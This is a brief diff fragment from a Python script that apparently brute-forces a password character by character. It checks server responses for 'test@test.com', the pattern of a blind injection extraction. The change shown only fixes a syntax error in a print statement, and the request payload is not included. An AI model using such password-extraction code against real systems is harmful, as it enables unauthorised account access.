@@ -37,7 +37,7 @@ for i in range(1,62):
 		if('test@test.com' in response.text):
 			password.append(chr(char_dec))
 			
-			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: "char_dec)
+			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: ",char_dec)
 			break
 		
 		
